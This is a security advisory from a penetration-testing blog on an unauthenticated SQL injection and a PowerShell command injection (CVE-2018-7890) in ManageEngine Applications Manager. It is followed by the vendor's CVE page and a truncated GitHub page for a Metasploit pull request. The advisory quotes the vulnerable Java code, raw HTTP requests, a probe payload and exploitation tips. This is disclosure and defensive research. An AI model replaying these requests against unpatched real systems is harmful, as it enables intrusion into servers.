=== Content from pentest.blog_83c375e1_20250126_041727.html ===

[Skip to main content](#content)
[![Pentest Blog](https://pentest.blog/wp-content/uploads/pentestblog-color-e1508706802866.png)](https://pentest.blog/)

Toggle navigation

* [Advisories](https://pentest.blog/category/advisories/)
* [Operating System](https://pentest.blog/category/operating-system/)
* [Application Security](https://pentest.blog/category/application-security/)
* [Network](https://pentest.blog/category/network/)
* [Tools](https://pentest.blog/category/tools/)
* [Article Series](https://pentest.blog/article-series/)
* [About Us](https://pentest.blog/about-us/)

![](https://pentest.blog/wp-content/uploads/confused-880735_1280-750x410.jpg)
# Advisory | ManageEngine Applications Manager Remote Code Execution and SQLi

 [March 7, 2018March 8, 2018](https://pentest.blog/advisory-manageengine-applications-manager-remote-code-execution-sqli-and/)  [Mehmet Ince](https://pentest.blog/author/mehmet-ince/)
[Advisories](https://pentest.blog/category/advisories/)

It is an interesting coincidence that almost 1 year ago we identified a critical security issue in a different product (Eventlog Analyzer) of this company. Now, this time we‚Äôve came across with another product of this company during penetration test. To be honest I‚Äôve seen more than 20 different high/critical vulnerability during the analysis of the product but I will only share two of them now, as a full disclosure.

### Advisory Informations

**Remotely Exploitable:** Yes

**Authentication Required:** NO

**Vendor URL:** https://www.manageengine.com/products/applications\_manager/download.html

**CVSSv3 Score:**¬†10.0

**Date of found:**¬†07 Mar 2018

### Technical Details

#### Vulnerability #1 ‚Äì Unauthenticated SQL Injection (BONUS!)

I do always start the analysis by reading web.xml files. That will give you abstract level of idea what the heck is happening within the software. Following definition was quite interesting for me.

```
...
<action path="/jsonfeed" type="com.adventnet.appmanager.struts.actions.JSONFeed" scope="request" parameter="method">
</action>
...
```

While I was reviewing the class I immediately detect multiple potential SQLi issue. Here is one example.

```
public void getConsoleJSONFeed(ActionMapping mapping, ActionForm form, HttpServletRequest request, HttpServletResponse response)
    throws Exception
  {
    StringBuffer jsonStr = new StringBuffer();
    try
    {
      String toReturn = request.getParameter("toReturn");
      String mgId = request.getParameter("mgId");
      String monType = request.getParameter("category");

      String query = null;
      if ((toReturn != null) && (toReturn.equals("allMGResource"))) {
        query = "select RESOURCENAME,RESOURCEID,TYPE from AM_ManagedObject where AM_ManagedObject.TYPE='HAI'";
      } else if ((toReturn != null) && (toReturn.equals("allMonInMG"))) {
        query = "select RESOURCENAME,RESOURCEID,TYPE from AM_ManagedObject, AM_PARENTCHILDMAPPER where AM_ManagedObject.RESOURCEID=AM_PARENTCHILDMAPPER.CHILDID and AM_PARENTCHILDMAPPER.PARENTID='" + mgId + "' and AM_ManagedObject.TYPE in " + Constants.serverTypes;
      } else if ((toReturn != null) && (toReturn.equals("OpManResource"))) {
        if (monType != null)
        {
          monType = "OpManager-" + monType;
          query = "select RESOURCENAME,RESOURCEID,SUBSTRING(AM_ManagedObject.TYPE,11),AM_AssociatedExtDevices.IPADDRESS from AM_ManagedObject, AM_PARENTCHILDMAPPER, AM_AssociatedExtDevices, ExternalDeviceDetails where AM_ManagedObject.RESOURCEID=AM_PARENTCHILDMAPPER.CHILDID and AM_PARENTCHILDMAPPER.PARENTID='" + mgId + "' and AM_ManagedObject.TYPE like 'OpManager-%' and AM_AssociatedExtDevices.RESID=AM_PARENTCHILDMAPPER.CHILDID and AM_AssociatedExtDevices.IPADDRESS=ExternalDeviceDetails.IPADDRESS and ExternalDeviceDetails.CATEGORY='" + monType + "'";
        }
        else if (mgId == null)
        {
          query = "select RESOURCENAME,RESOURCEID,SUBSTRING(TYPE,11),IPADDRESS from AM_ManagedObject,AM_AssociatedExtDevices where AM_ManagedObject.TYPE like 'OpManager-%' and AM_AssociatedExtDevices.RESID=AM_ManagedObject.RESOURCEID";
        }
        else
        {
          query = "select RESOURCENAME,RESOURCEID,SUBSTRING(TYPE,11),IPADDRESS from AM_ManagedObject,AM_AssociatedExtDevices,AM_PARENTCHILDMAPPER where AM_ManagedObject.RESOURCEID=AM_PARENTCHILDMAPPER.CHILDID and AM_AssociatedExtDevices.RESID=AM_ManagedObject.RESOURCEID and AM_PARENTCHILDMAPPER.PARENTID='" + mgId + "' and AM_ManagedObject.TYPE like 'OpManager-%'";
        }
      }
      ArrayList monList = this.mo.getRows(query);
...
```

Since I was familiar with the ManageEngine company‚Äôs product, I knew how to trigger this section of the class.

```
GET /jsonfeed.do?method=getParentGroups&haid=10000055 HTTP/1.1
Host: 12.0.0.226:9090
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:56.0) Gecko/20100101 Firefox/56.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
--
HTTP/1.1 200 OK
Server: Apache-Coyote/1.1
Set-Cookie: JSESSIONID_APM_9090=88629946E13962211BA3562D33EB2ED8; Path=/; HttpOnly
Cache-Control: max-age=0, no-cache, no-store, must-revalidate
Expires: 0
Pragma: no-cache
Content-Type: text/html;charset=UTF-8
Content-Length: 32
Date: Wed, 07 Mar 2018 19:54:13 GMT
Connection: close

{"0":["Applications Manager"]}

```

How did I know that I can access this end-point without authentication ? That question is not something that I want to jump-in right now. I started exploiting this SQLi issue manually but somehow I wasn‚Äôt receiving expected behavior. Thus, I‚Äôve decided to understand what kind of sql query was received by RDMS.

Protip: Do not try to patch application or change configuration of RDMS service. These kind of product always logs error. So you just need to find a log file location and trace it.

Here is the what I‚Äôve seen when I send following payload.

```
12.0.0.226:9090/jsonfeed.do?method=getParentGroups&haid=10000055%27%22%3C%3E
```
```
root@asd:/opt/ME/AppManager13/AppManager13# tail -f logs/swissql00.log

Mar 07, 2018 11:59:35 AM com.adventnet.appmanager.db.AMConnectionPool executeQueryStmt
SEVERE: [SQL ERROR] select RESOURCENAME,RESOURCEID from AM_ManagedObject,AM_PARENTCHILDMAPPER where AM_PARENTCHILDMAPPER.CHILDID='10000055&#39;&quot;&lt;&gt;' and AM_ManagedObject.RESOURCEID=AM_PARENTCHILDMAPPER.PARENTID and AM_ManagedObject.TYPE='HAI'
org.postgresql.util.PSQLException: ERROR: invalid input syntax for integer: "10000055&#39;&quot;&lt;&gt;"
  Position: 110
  at org.postgresql.core.v3.QueryExecutorImpl.receiveErrorResponse(QueryExecutorImpl.java:2102)
  at org.postgresql.core.v3.QueryExecutorImpl.processResults(QueryExecutorImpl.java:1835)
  at org.postgresql.core.v3.QueryExecutorImpl.execute(QueryExecutorImpl.java:257)
  at org.postgresql.jdbc2.AbstractJdbc2Statement.execute(AbstractJdbc2Statement.java:500)

```

Okay, this is awkward. You know that one of most common mottos of the application security is ‚ÄúValidate input, encode output‚Äù. But it seems, whoever¬†has tried to apply this motto into this project has mind-confusion. Such global modification of inputs can cause more trouble then you can imagine. But in this case,¬†developers made two completely unrelated mistakes. First one cause a SQLi. But second one, a stroke of luck, makes first one impossible to exploit.

Obviously, this is unexploitable vulnerability. Okay‚Ä¶ So we just need to find a following things at the same time so we could have SQLi.

1. We don‚Äôt have any credentials. Authenticated SQLis are of the table (I‚Äôve seen 50+ authenticated SQLi during this analysis)
2. It seem special characters, such as quotes, are globally encoded. So we need to find a sql query that takes user input without surrounding any quotes. (Protip: Look for integer inputs üôÇ

Within a several seconds, I‚Äôve detected following public method of same class.

```
public void getMonitorCount(ActionMapping mapping, ActionForm form, HttpServletRequest request, HttpServletResponse response)
   throws Exception
 {
   JSONObject count = new JSONObject();
   AMConnectionPool cp = AMConnectionPool.getInstance();
   ResultSet result = null;
   String haid = request.getParameter("haid");
   if (haid == null) {
     haid = "0";
   }
   String query = "select \"SYS\",count(*) from AM_ManagedObject,AM_PARENTCHILDMAPPER where AM_PARENTCHILDMAPPER.PARENTID=" + haid + " and AM_PARENTCHILDMAPPER.CHILDID=AM_ManagedObject.RESOURCEID and type in" + Constants.serverTypes + " union select \"APP\",count(*) from AM_ManagedObject,AM_PARENTCHILDMAPPER where AM_PARENTCHILDMAPPER.PARENTID=" + haid + " and AM_PARENTCHILDMAPPER.CHILDID=AM_ManagedObject.RESOURCEID and type not in " + Constants.serverTypes + " and type not like '%OpManager%' union  select \"NWD\",count(*) from AM_ManagedObject,AM_PARENTCHILDMAPPER where AM_PARENTCHILDMAPPER.PARENTID=" + haid + " and AM_PARENTCHILDMAPPER.CHILDID=AM_ManagedObject.RESOURCEID and type like '%OpManager%'";
   try
   {
     result = AMConnectionPool.executeQueryStmt(query);
     while (result.next()) {
       count.append(result.getString(1), result.getString(2));
     }
     try
     {
       if (result != null) {
         result.close();
       }
     }
     catch (Exception e)
     {
       e.printStackTrace();
     }
     out = response.getOutputStream();
   }
```

Look for the¬†`haid` parameter at the middle of the SQL query. You can see that it‚Äôs not given into the query within single/double quotes. Which means we don‚Äôt need to escape from anything. It‚Äôs quite possible to directly modify the query.

*Most funny thing about this case is that the final query was designed only for MsSQL. But this product also support Postgresql‚Ä¶ Actually, it‚Äôs shipped with psql.*

POC URL

```
http://12.0.0.226:9090/jsonfeed.do?method=getMonitorCount&haid=10000055
```
#### Vulnerability #2 ‚Äì Unauthenticated Remote Code Execution

While I was poking around, I‚Äôve realised that testCredentials.do endpoint‚Äôs was accessible without having authentication cookie. ¬†So i thought it‚Äôs worth to give a try to dive into the business logic of this module.

`TestCredentials` class have two different publicly accessible class method. Here is the most interesting one.

```
public ActionForward testCredentialForConfMonitors(ActionMapping mapping, ActionForm form, HttpServletRequest request, HttpServletResponse response)
  {
    Properties authResult = new Properties();
    String monType = null;
    try
    {
      monType = request.getParameter("montype");
      if ((monType == null) || (monType.equalsIgnoreCase("null"))) {
        monType = request.getParameter("type");
      }
      NewMonitorConf newMonConf = new NewMonitorConf();
      if ((newMonConf.preConfMap.containsKey(monType)) || (monType.equalsIgnoreCase("node")))
      {
        monType = newMonConf.getResourceTypeForPreConf(monType);

        authResult = newMonConf.getAuthResultAsPerResourceType(monType, request, true);
      }
      else
      {
        Properties props = NewMonitorConf.getClass(monType);
        ArrayList args = NewMonitorUtil.getArgsforConfMon(monType);
        String dcclass = props.getProperty("dcclass");
        CustomDCInf amdc = (CustomDCInf)Class.forName(dcclass).newInstance();
        Properties argsasprops = NewMonitorConf.getValuesforArgs(request, args);
        authResult = amdc.CheckAuthentication(argsasprops);
      }
      response.setContentType("text/html; charset=UTF-8");
      PrintWriter out = response.getWriter();
      if (authResult.getProperty("authentication").equalsIgnoreCase("passed"))
      {
        String passedMsg = NmsUtil.GetString("Passed");
        out.println("<font color=green>" + passedMsg + "</font>");
        out.flush();
      }
      else
      {
        // ... OMITTED CODE SECTION ...
      }
    }
    catch (NoClassDefFoundError er)
    {
      er.printStackTrace();
      try
      {
        if ("WebsphereMQ".equals(monType))
        {
          // ... OMITTED CODE SECTION ...
        }
      }
      catch (Exception e)
      {
        e.printStackTrace();
      }
    }
    catch (Exception ex)
    {
      ex.printStackTrace();
    }
    return null;
  }
```

That was the moment I started to think about some attack vectors. After all, this products name is ‚ÄúApplications Manager‚Äù. It means that this product is able to access servers, applications, databases, etc. etc etc. For this reason, I‚Äôve decided to checkout the features of¬† the product.

Following screenshot shows a list of product that can be tracked by using Application Manager. I do understand how to fetch information from databases, linux systems but what about¬†MS Office SharePoint or¬†Microsoft Lync ? I wouldn‚Äôt directly execute powershell or vbs script but most of the developers don‚Äôt think like ~~me~~ us.

![](https://pentest.blog/wp-content/uploads/supported-features-1024x482.png)

If i truly understand what is happening at¬†`NewMonitor` class, I could find more realistic attack vectors instead of assumptions.

After spending multiple hours poking around. I‚Äôve came across with following class.

```
public Properties CheckAuthentication(Properties props)
  {
    Properties authresult = new Properties();
    String availmess = null;
    boolean authentication = false;

    String host = props.getProperty("HostName");
    String username = props.getProperty("UserName");
    String password = props.getProperty("Password");
    boolean isPowershellEnabled = Boolean.parseBoolean(props.getProperty("Powershell", "FALSE"));
    String authMode = (props.getProperty("CredSSP") != null) && (props.getProperty("CredSSP").equals("Yes")) ? "CredSSP" : "";
    if (!isPowershellEnabled)
    {
      WMIDataCollector wl = new WMIDataCollector();
      String wmiquery = "Select * from Win32_PerfRawData_PerfOS_Processor where Name='_Total'";
      Properties output = wl.getData(host, username, password, wmiquery, new Vector(), "wmiget.vbs");
      if (output.get("ErrorMsg") != null)
      {
        if (((String)output.get("ErrorMsg")).indexOf("The RPC server is unavailable") != -1) {
          availmess = FormatUtil.getString("am.webclient.sharepoint.rpcerror.text");
        } else if (((String)output.get("ErrorMsg")).indexOf("Access is denied") != -1) {
          availmess = FormatUtil.getString("am.webclient.sharepoint.accessdenied.text");
        } else {
          availmess = (String)output.get("ErrorMsg");
        }
      }
      else {
        authentication = true;
      }
    }
    else
    {
      List<String[]> outputFromScript = null;
      boolean farmtype = props.getProperty("SPType", "SPServer").equalsIgnoreCase("Farm");

      String psFilePath = System.getProperty("user.dir") + File.separator + "conf" + File.separator + "application" + File.separator + "scripts" + File.separator + "powershell" + File.separator + "TestConnectivity.ps1";
      File psFile = new File(psFilePath);
      password = password.replaceAll("'", "''");
      String scriptToExecute = "powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden \"&{&'" + psFile.getAbsolutePath() + "' " + host + " " + username + " '" + password + "'}\"";
      if (farmtype) {
        scriptToExecute = "powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden \"&{&'" + psFile.getAbsolutePath() + "' " + host + " " + username + " '" + password + "' " + "'FarmType' '" + authMode + "'}\"";
      }
      AMLog.debug("SharePointServerDataCollector::resourcename: " + props.getProperty("resourcename") + " ,reourceid: " + props.getProperty("resourceid") + " ,hostname: " + props.getProperty("HostName") + ",powershell: " + props.getProperty("PowerShell") + " ::scriptToExecute:" + psFilePath);
      try
      {
        Process proc = Runtime.getRuntime().exec(scriptToExecute);
        RuntimeProcessStreamReader readerThread = new RuntimeProcessStreamReader(host, scriptToExecute, proc, 300, true, "inputstream", true);
```

As you can see host, username and password are being passed to the powershell command without sanitisation. Ofcourse I‚Äôve trace down from input to here in order to make sure about it.

Here is the necessary HTTP request to trigger this issue.

```
POST /testCredential.do HTTP/1.1
Host: 12.0.0.226:9090
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.73 Safari/537.36
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Content-Length: 595
Connection: close

&method=testCredentialForConfMonitors&cacheid=1520419442645&type=OfficeSharePointServer&serializedData=url=%2Fjsp%2FnewConfType.jsp&searchOptionValue=&query=&method=createMonitor&addtoha=null&resourceid=&montype=OfficeSharePointServer&isAgentEnabled=NO&resourcename=null&isAgentAssociated=false&hideFieldsForIT360=null&childNodesForWDM=%5B%5D&type=OfficeSharePointServer&displayname=asd&HostName=12.0.0.226&Version=2013&Services=False&Service=False&Powershell=True&CredSSP=False&SPType=SPServer&CredentialDetails=nocm&cmValue=-1&UserName=qwe&Password=qwe&allowEdit=true&pollinterval=5&groupname=
```
### Metasploit Module

Here is the metasploit module that exploits this command injection vulnerability.

PR to the msf master branch (<https://github.com/rapid7/metasploit-framework/pull/9684>)

[0day](https://pentest.blog/tag/0day/)

![](https://secure.gravatar.com/avatar/a02c8481b3d29584e05195893e584b61?s=60&d=monsterid&r=g)

#### [Mehmet Ince](https://pentest.blog/author/mehmet-ince/)

Master Ninja @ Prodaft / INVICTUS Europe.

## Post navigation

 [Advisory | Xplico Unauthenticated Remote Code Execution CVE-2017-16666](https://pentest.blog/advisory-xplico-unauthenticated-remote-code-execution-cve-2017-16666/)[Unexpected Journey #6 ‚Äì All ways lead to Rome ! Remote Code Execution on MicroFocus Secure Messaging Gateway](https://pentest.blog/unexpected-journey-6-all-ways-lead-to-rome-remote-code-execution-on-microfocus-secure-messaging-gateway/)

Search for:

### PRODAFT Cyber Intelligence and Cyber Security Services

[![](https://pentest.blog/wp-content/uploads/Mg6EYwIk_400x400.jpg)](https://www.invictuseurope.com/)

### Recent Posts

* [Advisory | NetModule Router Software Race Condition Leads to Remote Code Execution](https://pentest.blog/advisory-netmodule-router-software-race-condition-leads-to-remote-code-execution/)
* [Advisory | Roxy-WI Unauthenticated Remote Code Executions CVE-2022-31137](https://pentest.blog/advisory-roxy-wi-unauthenticated-remote-code-executions-cve-2022-31137/)
* [Advisory | GLPI Service Management Software Multiple Vulnerabilities and Remote Code Execution](https://pentest.blog/advisory-glpi-service-management-software-sql-injection-remote-code-execution-and-local-file-inclusion/)
* [LiderAhenk 0day ‚Äì All your PARDUS Clients Belongs To Me (CVE-2021-3825)](https://pentest.blog/liderahenk-0day-all-your-pardus-clients-belongs-to-me/)
* [Pardus 21 Linux Distro ‚Äì Remote Code Execution 0day 2021 CVE-2021-3806](https://pentest.blog/pardus-21-linux-distro-remote-code-execution-0day-2021/)
### Latest Comments

* [Ege Balci](https://github.com/EgeBalci) on [Art of Anti Detection 3 ‚Äì Shellcode Alchemy](https://pentest.blog/art-of-anti-detection-3-shellcode-alchemy/#comment-1244)
* Chase Run Taylor on [Art of Anti Detection 1 ‚Äì Introduction to AV & Detection Techniques](https://pentest.blog/art-of-anti-detection-1-introduction-to-av-detection-techniques/#comment-1243)
* [Mehmet ƒ∞nce](http://www.mehmetince.net/) on [Unexpected Journey #4 ‚Äì Escaping from Restricted Shell and Gaining Root Access to SolarWinds Log & Event Manager (SIEM) Product](https://pentest.blog/unexpected-journey-4-escaping-from-restricted-shell-and-gaining-root-access-to-solarwinds-log-event-manager-siem-product/#comment-1242)
* 0x00 on [Unexpected Journey #4 ‚Äì Escaping from Restricted Shell and Gaining Root Access to SolarWinds Log & Event Manager (SIEM) Product](https://pentest.blog/unexpected-journey-4-escaping-from-restricted-shell-and-gaining-root-access-to-solarwinds-log-event-manager-siem-product/#comment-1241)
* [Mehmet ƒ∞nce](http://www.mehmetince.net/) on [Unexpected Journey #4 ‚Äì Escaping from Restricted Shell and Gaining Root Access to SolarWinds Log & Event Manager (SIEM) Product](https://pentest.blog/unexpected-journey-4-escaping-from-restricted-shell-and-gaining-root-access-to-solarwinds-log-event-manager-siem-product/#comment-1240)
### Tags

[0day](https://pentest.blog/tag/0day/)
[1day](https://pentest.blog/tag/1day/)
[advisory](https://pentest.blog/tag/advisory/)
[alienvault](https://pentest.blog/tag/alienvault/)
[android](https://pentest.blog/tag/android/)
[application](https://pentest.blog/tag/application/)
[assembly](https://pentest.blog/tag/assembly/)
[bof](https://pentest.blog/tag/bof/)
[burp](https://pentest.blog/tag/burp/)
[bypass](https://pentest.blog/tag/bypass/)
[crypter](https://pentest.blog/tag/crypter/)
[decoder](https://pentest.blog/tag/decoder/)
[dns](https://pentest.blog/tag/dns/)
[EMET](https://pentest.blog/tag/emet/)
[encoder](https://pentest.blog/tag/encoder/)
[exploit](https://pentest.blog/tag/exploit/)
[hook](https://pentest.blog/tag/hook/)
[iat](https://pentest.blog/tag/iat/)
[icmp](https://pentest.blog/tag/icmp/)
[in-memory](https://pentest.blog/tag/in-memory/)
[IOT](https://pentest.blog/tag/iot/)
[linux](https://pentest.blog/tag/linux/)
[malware](https://pentest.blog/tag/malware/)
[metasploit](https://pentest.blog/tag/metasploit/)
[multi-stage](https://pentest.blog/tag/multi-stage/)
[nas](https://pentest.blog/tag/nas/)
[packer](https://pentest.blog/tag/packer/)
[php](https://pentest.blog/tag/php/)
[ransomware](https://pentest.blog/tag/ransomware/)
[rce](https://pentest.blog/tag/rce/)
[reflective](https://pentest.blog/tag/reflective/)
[research](https://pentest.blog/tag/research/)
[reverse](https://pentest.blog/tag/reverse/)
[reversing](https://pentest.blog/tag/reversing/)
[secure coding](https://pentest.blog/tag/secure-coding/)
[securityonion](https://pentest.blog/tag/securityonion/)
[self-defence](https://pentest.blog/tag/self-defence/)
[shellcode](https://pentest.blog/tag/shellcode/)
[siem](https://pentest.blog/tag/siem/)
[sql injection](https://pentest.blog/tag/sql-injection/)
[sqlmap](https://pentest.blog/tag/sqlmap/)
[stager](https://pentest.blog/tag/stager/)
[storage](https://pentest.blog/tag/storage/)
[tunneling](https://pentest.blog/tag/tunneling/)
[windows](https://pentest.blog/tag/windows/)
### Awarded Top 15 Pentest Blog

[![Pentest Blogs](/wp-content/uploads/pentest_1000px.png)](https://blog.feedspot.com/pentest_blogs/ "Pentest Blogs")

INVICTUS Cyber Security & Intelligence Services | Theme by [Colorlib](http://colorlib.com/) Powered by [WordPress](http://wordpress.org/)



=== Content from www.manageengine.com_4879cd71_20250124_230054.html ===


[Schedule demo](https://www.manageengine.com/products/applications_manager/demo.html?demorhsFixed)

[![Application Performance Monitoring - ManageEngine Applications Manager](../../../images/logo/applicationsmanager.svg "Application Performance Monitoring - ManageEngine Applications Manager")](../../applications_manager/)

[Download](../download.html "Download ManageEngine Applications Manager")

* [Overview](../../applications_manager/)
* [Features](../applications-monitoring-features.html)
* [Demo](../demo.html)
* [Get Quote](../get-quote.html)
* [Editions](../applications-manager-comparison.html)
* [Resources](../document.html)
  + [What's New](https://www.manageengine.com/products/applications_manager/document.html#whatsnew)
  + [Product Info](https://www.manageengine.com/products/applications_manager/document.html#productinfo)
  + [Blog / Articles](https://www.manageengine.com/products/applications_manager/document.html#blog-articles)
  + [White Papers / e-book](https://www.manageengine.com/products/applications_manager/document.html#whitepaper-ebook)
  + [Video](https://www.manageengine.com/products/applications_manager/document.html#video)
  + [Tech Topics](https://www.manageengine.com/products/applications_manager/document.html#techtopics)
* [Customers](../customer.html)
* [Support](../support.html)

¬†¬†¬†¬†¬†¬†Security Updates - CVE Database

[Home](../../applications_manager/) ¬ª [Support](https://www.manageengine.com/products/applications_manager/support.html) ¬ª [Security Updates](https://www.manageengine.com/products/applications_manager/security-updates/security-updates.html) ¬ª CVE-2018-7890

## CVE-2018-7890

### Unauthenticated remote code execution vulnerability

| Vulnerability Details | |
| --- | --- |
| Impact | **CVSS V3 rating:** 9.8 CRITICAL |
| Reported | 07 March 2018 |
| Fixed | 12 March 2018 |
| Affected Builds | Till Build 13630 |
| Fixed in | Build 13640 |
| Overview | Unauthenticated remote code execution vulnerability |
| **Recommended Fix** | **Upgrade to Applications Manager Version 13640 or above.** |

### Description

A remote code execution issue was discovered in Applications Manager before build 13640. The publicly accessible testCredential.do endpoint takes multiple user inputs and validates supplied credentials by accessing a specified system. This endpoint calls several internal classes, and then executes a PowerShell script. If the specified system is OfficeSharePointServer, then the username and password parameters to this script are not validated, leading to Command Injection.

We recommend that you upgrade to Applications Manager Version 13640 or above to fix this issue.

**Source and Acknowledgements**

Find out more about CVE-2018-7890 from the  [CVE dictionary](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7890) and [NIST NVD](https://nvd.nist.gov/vuln/detail/CVE-2018-7890).

Other Resources: ¬†[https://pentest.blog/advisory-manageengine-applications-manager-remote-code-execution-sqli-and/](http://pentest.blog/advisory-manageengine-applications-manager-remote-code-execution-sqli-and/)

### Need Help?

For clarification or corrections please contact our [support team](https://www.manageengine.com/products/applications_manager/support.html) or email us at appmanager-support@manageengine.com

## Loved by customers all over the world

![Gartner Peer Insights](../images/footer/client-logo/gartner-peer-insights.svg)
#### "Standout Tool With Extensive Monitoring Capabilities"

‚òÖ
‚òÖ
‚òÖ
‚òÖ
‚òÖ

It allows us to track crucial metrics such as response times, resource utilization, error rates, and transaction performance. The real-time monitoring alerts promptly notify us of any issues or anomalies, enabling us to take immediate action.

Reviewer Role: Research and Development

[![](../images/footer/client/carlos-rivero.webp)](https://www.youtube.com/watch?v=d7Wbd6cUImY&t=1s)
##### "I like Applications Manager because it helps us to detect issues present in our servers and SQL databases."

###### Carlos Rivero

Tech Support Manager, Lexmark

##### Trusted by over 6000+ businesses globally

* [Download](../download.html?btmMenu "Download ManageEngine Applications Manager")
* [Live Demo](http://demo.appmanager.com/jsp/SingleSignOn.jsp?clienttype2=html&username=demo&password=demo&demolanguage=EN)
* [Compare Editions](../applications-manager-comparison.html?btmMenu)
* [Buy Now](https://store.manageengine.com/applications_manager/)
* [Pricing](https://www.manageengine.com/products/applications_manager/pricing.html?btmMenu)

* [Download](https://www.manageengine.com/products/applications_manager/download.html?utm_source=btmMenuapm "Download ManageEngine Applications Manager")
* [Request Demo](https://www.manageengine.com/products/applications_manager/get-quote.html?utm_source=btmMenuapm "Demo - ManageEngine Applications Manager")
* [Get Quote](https://www.manageengine.com/products/applications_manager/demo.html?utm_source=btmMenuapm "Get Quote ManageEngine Applications Manager")

[#### The ultimate APM playbook: Master challenges, implement best practices

Download e-book

![The ultimate APM playbook](../images/popup-banner/pop-promotion-img.webp)](https://www.manageengine.com/products/applications_manager/overcoming-roadblocks-and-mastering-best-practices-in-apm.html?apm-popup-banner)



=== Content from github.com_c8c49553_20250124_230048.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Frapid7%2Fmetasploit-framework%2Fpull%2F9684)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Frapid7%2Fmetasploit-framework%2Fpull%2F9684)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fpull_requests_fragments%2Fpull_request_layout&source=header-repo&source_repo=rapid7%2Fmetasploit-framework)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[rapid7](/rapid7)
/
**[metasploit-framework](/rapid7/metasploit-framework)**
Public

* [Notifications](/login?return_to=%2Frapid7%2Fmetasploit-framework) You must be signed in to change notification settings
* [Fork
  14.1k](/login?return_to=%2Frapid7%2Fmetasploit-framework)
* [Star
   34.6k](/login?return_to=%2Frapid7%2Fmetasploit-framework)

* [Code](/rapid7/metasploit-framework)
* [Issues
  412](/rapid7/metasploit-framework/issues)
* [Pull requests
  40](/rapid7/metasploit-framework/pulls)
* [Discussions](/rapid7/metasploit-framework/discussions)
* [Actions](/rapid7/metasploit-framework/actions)
* [Projects
  1](/rapid7/metasploit-framework/projects)
* [Wiki](/rapid7/metasploit-framework/wiki)
* [Security](/rapid7/metasploit-framework/security)
* [Insights](/rapid7/metasploit-framework/pulse)

Additional navigation options

* [Code](/rapid7/metasploit-framework)
* [Issues](/rapid7/metasploit-framework/issues)
* [Pull requests](/rapid7/metasploit-framework/pulls)
* [Discussions](/rapid7/metasploit-framework/discussions)
* [Actions](/rapid7/metasploit-framework/actions)
* [Projects](/rapid7/metasploit-framework/projects)
* [Wiki](/rapid7/metasploit-framework/wiki)
* [Security](/rapid7/metasploit-framework/security)
* [Insights](/rapid7/metasploit-framework/pulse)

New issue

**Have a question about this project?** Sign up for a free GitHub account to open an issue and contact its maintainers and the community.

 [Sign up for GitHub](/signup?return_to=%2Frapid7%2Fmetasploit-framework%2Fissues%2Fnew%2Fchoose)

By clicking ‚ÄúSign up for GitHub‚Äù, you agree to our [terms of service](https://docs.github.com/terms) and
